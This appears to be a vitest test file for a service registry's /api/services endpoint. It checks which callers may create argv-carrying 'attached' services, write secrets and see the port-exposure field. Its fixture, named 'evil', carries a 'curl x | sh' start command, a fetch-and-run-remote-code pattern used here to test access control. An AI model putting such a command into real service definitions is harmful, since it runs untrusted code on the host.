/**
 * Mutation authorization on `/api/services`: operate bearer or locally
 * trusted only (strict-mode aware); trusted-network and observe/control
 * callers are refused and the file is untouched. Plus the exposure field.
 * See change: add-service-registry-core (test-plan E46).
 */
import { createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import rateLimit from "@fastify/rate-limit";
import Fastify, { type FastifyInstance } from "fastify";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { registerBearerAuth } from "../../auth/bearer-auth.js";
import { createLocalTrustContext } from "../../auth/local-proof.js";
import { createNetworkGuard } from "../../auth/localhost-guard.js";
import { createRouteTierGate } from "../../auth/route-tier-gate.js";
import { PairedDeviceRegistry } from "../../pairing/paired-devices.js";
import { registerServiceRoutes } from "../routes.js";
import { buildApp, FakeDriver, makeManager, ociDef, tmpRoot, writeDefinitions } from "./helpers.js";

let root: string;
const apps: FastifyInstance[] = [];
beforeEach(() => {
  root = tmpRoot("svc-routes-");
  writeDefinitions(root, []);
});
afterEach(async () => {
  for (const a of apps.splice(0)) await a.close();
  fs.rmSync(root, { recursive: true, force: true });
});

const TRUSTED = "198.51.100.0/24";
const sha = () => createHash("sha256").update(fs.readFileSync(path.join(root, "services.json"))).digest("hex");

async function mkApp(strict: boolean) {
  const reg = new PairedDeviceRegistry(path.join(root, "paired.json"));
  const tokens = {
    observe: reg.add("o", "manual", "observe").token,
    control: reg.add("c", "manual", "control").token,
    operate: reg.add("p", "manual", "operate").token,
  };
  const localTrust = createLocalTrustContext("local-token-xyz", () => strict);
  const { manager } = makeManager(root);
  const app = Fastify();
  apps.push(app);
  await app.register(rateLimit, { global: true, max: 100_000, timeWindow: "1 minute" });
  app.decorateRequest("isAuthenticated", false);
  registerBearerAuth(app, { registry: reg });
  app.addHook("onRequest", createRouteTierGate({ getTrustedNetworks: () => [TRUSTED], localTrust, logRefusal: () => {} }));
  registerServiceRoutes(app, { manager, networkGuard: createNetworkGuard([TRUSTED], { localTrust }), localTrust });
  await app.ready();
  return { app, tokens };
}

const attached = {
  definition: {
    id: "evil",
    mode: "attached",
    endpoints: { http: "http://127.0.0.1:9" },
    lifecycle: { start: { darwin: ["sh", "-c", "curl x | sh"] } },
    health: { kind: "tcp", endpoint: "http" },
  },
};

describe("E46 — who may create an attached (argv-carrying) service", () => {
  it.each([
    ["loopback", false, "127.0.0.1", undefined, true],
    ["loopback under strict mode without proof", true, "127.0.0.1", undefined, false],
    ["trusted-network, unauthenticated", false, "198.51.100.7", undefined, false],
    ["observe bearer", false, "203.0.113.5", "observe", false],
    ["control bearer", false, "203.0.113.5", "control", false],
    ["observe bearer on loopback (tier-gate exempt)", false, "127.0.0.1", "observe", false],
    ["operate bearer", false, "203.0.113.5", "operate", true],
  ] as const)("%s → %s", async (_label, strict, remoteAddress, tier, accepted) => {
    const { app, tokens } = await mkApp(strict);
    const before = sha();
    const res = await app.inject({
      method: "POST",
      url: "/api/services",
      remoteAddress,
      headers: tier ? { authorization: `Bearer ${tokens[tier]}` } : {},
      payload: attached,
    });
    if (accepted) {
      expect(res.statusCode, res.body).toBe(200);
      expect(JSON.parse(fs.readFileSync(path.join(root, "services.json"), "utf8")).services.map((s: { id: string }) => s.id)).toEqual(["evil"]);
    } else {
      expect([401, 403]).toContain(res.statusCode);
      expect(sha()).toBe(before);
    }
  });

  it("reads stay behind the network guard only: a trusted-network caller may list", async () => {
    const { app } = await mkApp(false);
    expect((await app.inject({ method: "GET", url: "/api/services", remoteAddress: "198.51.100.7" })).statusCode).toBe(200);
    expect((await app.inject({ method: "GET", url: "/api/services", remoteAddress: "203.0.113.9" })).statusCode).toBeGreaterThanOrEqual(400);
  });

  it("a trusted-network caller cannot write a secret either", async () => {
    writeDefinitions(root, [ociDef({ secrets: { password: {} } })]);
    const { app } = await mkApp(false);
    const res = await app.inject({ method: "PUT", url: "/api/services/docling/secrets/password", remoteAddress: "198.51.100.7", payload: { value: "x" } });
    expect(res.statusCode).toBe(403);
    expect(fs.existsSync(path.join(root, "services-secrets.json"))).toBe(false);
  });
});

describe("exposure — a port bound on all interfaces is flagged", () => {
  it("GET /api/services reports exposure: all-interfaces", async () => {
    writeDefinitions(root, [ociDef()]);
    const driver = new FakeDriver("oci:docker");
    const { manager } = makeManager(root, { drivers: { "oci:docker": driver }, exposure: async () => "all-interfaces" });
    await manager.ensure("docling");
    const app = await buildApp(manager);
    apps.push(app);
    const s = (await app.inject({ method: "GET", url: "/api/services" })).json().data.services[0];
    expect(s.exposure).toBe("all-interfaces");
  });

  it("exposure is cached per port for 30 s (reads never drive a scan per call)", async () => {
    writeDefinitions(root, [ociDef()]);
    let scans = 0;
    const { manager, clock } = makeManager(root, {
      drivers: { "oci:docker": new FakeDriver("oci:docker") },
      exposure: async () => {
        scans++;
        return "loopback";
      },
    });
    await manager.ensure("docling");
    for (let i = 0; i < 5; i++) await manager.list();
    expect(scans).toBe(1);
    clock.advance(31_000);
    await manager.list();
    expect(scans).toBe(2);
  });
});
